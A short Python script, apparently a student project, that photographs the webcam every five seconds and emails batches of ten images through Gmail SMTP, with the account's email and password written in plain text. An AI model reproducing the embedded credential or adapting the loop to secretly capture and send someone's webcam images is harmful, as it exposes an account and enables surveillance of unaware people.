import cv2
import time
import os
import smtplib
import ssl
from email.mime.text import MIMEText
from email.utils import formataddr
from email.mime.multipart import MIMEMultipart  # New line
from email.mime.base import MIMEBase  # New line
from email import encoders  # New line

def send_email() :

    # User configuration
    sender_email = "21522104@gm.uit.edu.vn"
    sender_name = "VHH"
    password = "Huyhoangdeptrai2003"

    receiver_emails = ["21522104@gm.uit.edu.vn"]
    receiver_names = ["VHH"]

    # Email body

    filename0 = 'picture/0.png'
    filename1 = 'picture/1.png'
    filename2 = 'picture/2.png'
    filename3 = 'picture/3.png'
    filename4 = 'picture/4.png'
    filename5 = 'picture/5.png'
    filename6 = 'picture/6.png'
    filename7 = 'picture/7.png'
    filename8 = 'picture/8.png'
    filename9 = 'picture/9.png'
    listfile = [filename0,filename1,filename2,filename3,filename4,filename5,filename6,filename7,filename8,filename9]

    for receiver_email, receiver_name in zip(receiver_emails, receiver_names):
            print("Sending the email...")
            # Configurating user's info
            msg = MIMEMultipart()
            msg['To'] = formataddr((receiver_name, receiver_email))
            msg['From'] = formataddr((sender_name, sender_email))
            msg['Subject'] = 'Hello, my friend ' + receiver_name

            for i in listfile :
                try:
                    # Open PDF file in binary mode
                    with open(f"{i}", "rb") as attachment:
                                    part = MIMEBase("application", "octet-stream")
                                    part.set_payload(attachment.read())

                    # Encode file in ASCII characters to send by email
                    encoders.encode_base64(part)

                    # Add header as key/value pair to attachment part
                    part.add_header(
                            "Content-Disposition",
                            f"attachment; filename= {i}",
                    )

                    msg.attach(part)
                except Exception as e:
                        print(f"Oh no! We didn't found the attachment!n{e}")
                        break

            try:
                    # Creating a SMTP session | use 587 with TLS, 465 SSL and 25
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    # Encrypts the email
                    context = ssl.create_default_context()
                    server.starttls(context=context)
                    # We log in into our Google account
                    server.login(sender_email, password)
                    # Sending email from sender, to receiver with the email body
                    server.sendmail(sender_email, receiver_email, msg.as_string())
                    print('Email sent!')
            except Exception as e:
                    print(f'Oh no! Something bad happened!n{e}')
                    break
            finally:
                    print('Closing the server...')
                    server.quit()

cam = cv2.VideoCapture(0)

img_counter = 0

while True :

    ret,frame = cam.read()
    k = cv2.waitKey(1)

    img_name = f"{img_counter}.png"
    cv2.imwrite(img_name,frame)
    print("screenshot taken")
    os.replace(f"{img_counter}.png", f"picture/{img_counter}.png")
    img_counter += 1
    
    if img_counter == 10 :
        send_email()
        img_counter = 0

    time.sleep(5)

cam.release()

cam.destroyAllWindows()
